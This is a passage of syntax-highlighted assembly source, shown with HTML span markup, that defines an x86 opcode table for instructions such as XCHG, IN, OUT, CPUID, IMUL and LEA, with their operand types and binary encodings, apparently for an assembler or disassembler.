 </span><span class="sc5">instruction8</span><span class="sc0"> </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">AccWord</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">RegWord</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10010000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">5</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
</span><span class="sc1">;   variance            RegWord , AccWord, 10010000b ,  8,  0,  0,  5,  0,  0,  0 </span><span class="sc0">
    </span><span class="sc5">variance16</span><span class="sc0">          </span><span class="sc5">Mem</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Reg</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000011000000000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 


 </span><span class="sc5">instruction8</span><span class="sc0">  </span><span class="sc6">ENTER</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Imm16</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Imm8</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11001000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 

 </span><span class="sc5">instruction8</span><span class="sc0">  </span><span class="sc6">IN</span><span class="sc0">      </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Acc</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Imm8</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11100100b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance8</span><span class="sc0">            </span><span class="sc5">Acc</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">DX0</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11101100b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 

 </span><span class="sc5">instruction8</span><span class="sc0">  </span><span class="sc6">OUT</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Imm8</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Acc</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11100110b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance8</span><span class="sc0">            </span><span class="sc5">DX0</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Acc</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11101110b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 

 </span><span class="sc5">instruction8</span><span class="sc0">  </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Imm8</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11001101b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 


 </span><span class="sc5">instruction16</span><span class="sc0">   </span><span class="sc6">INVD</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0000111100001000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instruction16b</span><span class="sc0">  </span><span class="sc6">RSM</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0000111110101010b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instruction16b</span><span class="sc0">  </span><span class="sc6">RDMSR</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0000111100110010b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instruction16b</span><span class="sc0">  </span><span class="sc6">RDTSC</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0000111101010001b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instruction16b</span><span class="sc0">  </span><span class="sc6">RDPMC</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0000111100110011b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instruction16b</span><span class="sc0">  </span><span class="sc6">WBINVD</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0000111100001001b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instruction16b</span><span class="sc0">  </span><span class="sc6">WRMSR</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0000111100110000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instruction16b</span><span class="sc0">  </span><span class="sc6">CLTS</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0000111100000110b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instruction16b</span><span class="sc0">  </span><span class="sc6">CPUID</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0000111110100010b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 

 </span><span class="sc5">instruction16</span><span class="sc0">  </span><span class="sc6">ARPL</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Mem16</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Reg16</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0110001100000000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instruction16b</span><span class="sc0"> </span><span class="sc6">BOUND</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Reg32</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Mem64</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0110001000000000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 

 </span><span class="sc5">instruction16</span><span class="sc0">  </span><span class="sc6">BSWAP</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">RegWord</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0000111111001000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 

 </span><span class="sc5">instruction16</span><span class="sc0">  </span><span class="sc6">DIV</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Mem</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1111011000110000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instruction16b</span><span class="sc0"> </span><span class="sc6">IDIV</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Mem</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1111011000111000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 

 </span><span class="sc5">instruction16</span><span class="sc0">  </span><span class="sc6">IMUL</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">RegWord</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">MemWIm8</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0110101100000000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance16</span><span class="sc0">            </span><span class="sc5">RegWord</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">MemWImm</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0110100100000000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance16</span><span class="sc0">            </span><span class="sc5">RegWord</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Imm8</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0110101111000000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance16</span><span class="sc0">            </span><span class="sc5">RegWord</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Imm</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0110100111000000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance</span><span class="sc0">              </span><span class="sc5">RegWord</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">MemWord</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1010111100000000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">18</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance16</span><span class="sc0">            </span><span class="sc5">Mem</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1111011000101000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 

 </span><span class="sc5">instruction16</span><span class="sc0">  </span><span class="sc6">LDS</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Reg16</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Mem32</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1100010100000000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance16</span><span class="sc0">            </span><span class="sc5">Reg32</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Mem64</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1100010100000000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instruction16b</span><span class="sc0"> </span><span class="sc6">LES</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Reg16</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Mem32</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1100010000000000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance16b</span><span class="sc0">           </span><span class="sc5">Reg32</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Mem64</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1100010000000000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 

 </span><span class="sc5">instruction16</span><span class="sc0">  </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">RegWord</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Mem</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000110100000000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 

 </span><span class="sc5">instruction16</span><span class="sc0">  </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Mem</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Reg</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000010000000000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance8</span><span class="sc0">             </span><span class="sc5">Acc</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Imm</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10101000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
